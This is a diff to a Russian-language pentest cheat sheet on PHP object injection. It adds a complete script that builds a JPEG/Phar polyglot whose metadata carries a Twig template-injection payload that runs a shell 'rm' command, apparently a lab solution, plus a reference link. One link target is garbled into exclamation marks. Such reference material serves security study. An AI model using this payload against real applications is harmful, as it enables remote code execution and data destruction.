@@ -4,6 +4,7 @@
 * [Поиск и использование гаджетов](#Поиск-и-использование-гаджетов)
 * [Инструменты](#Инструменты)
 * [Десериализация Phar](№Десериализация-Phar)
+* [URL](#URL)
 
 > Внедрение PHP-объектов — это уязвимость уровня приложения, которая может позволить выполнять различные виды вредоносных атак, такие как внедрение кода, SQL-инъекция, обход пути и отказ в обслуживании приложения, в зависимости от контекста.
 >> Уязвимость возникает, когда вводимые пользователем данные не проходят надлежащую очистку перед передачей в функцию PHP unserialize(). Поскольку PHP допускает сериализацию объектов, злоумышленники могут передавать произвольные сериализованные строки в уязвимый вызов unserialize(), что приводит к внедрению произвольного PHP-объекта(ов) в область приложения.
@@ -16,7 +17,7 @@
 ```__destruct()``` при удалении объекта. 
 ```__toString()``` при преобразовании объекта в строку.
 
-Также следует проверить ```wrapper Phar://``` в [File Inclusion](), которая использует внедрение PHP-объекта.
+Также следует проверить ```wrapper Phar://``` в [File Inclusion](!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!), которая использует внедрение PHP-объекта.
 
 Уязвимый код:
 
@@ -240,3 +241,40 @@ $object = new AnyClass('whoami');
 $phar->setMetadata($object);
 $phar->stopBuffering();
 ```
+```php
+<?php
+class CustomTemplate {}
+class Blog {}
+
+if (ini_get('phar.readonly')) {
+    die("Run: php -d phar.readonly=0 " . basename(__FILE__) . "\n");
+}
+
+$object = new CustomTemplate;
+$blog = new Blog;
+$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
+$blog->user = 'user';
+$object->template_file_path = $blog;
+
+// Создаем реальный минимальный JPEG (1x1 pixel)
+$jpg = base64_decode('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCwAA8U/9k=');
+
+@unlink('wiener.phar');
+
+$phar = new Phar('wiener.phar');
+$phar->startBuffering();
+$phar->setStub($jpg . '<?php __HALT_COMPILER(); ?>');
+$phar->addFromString('test.txt', 'test');
+$phar->setMetadata($object);
+$phar->stopBuffering();
+
+copy('wiener.phar', 'wiener.jpg');
+@unlink('wiener.phar');
+
+echo "Upload wiener.jpg as avatar\n";
+?>
+```
+
+# URL
+
+* https://portswigger.net/research/top-10-web-hacking-techniques-of-2018#6
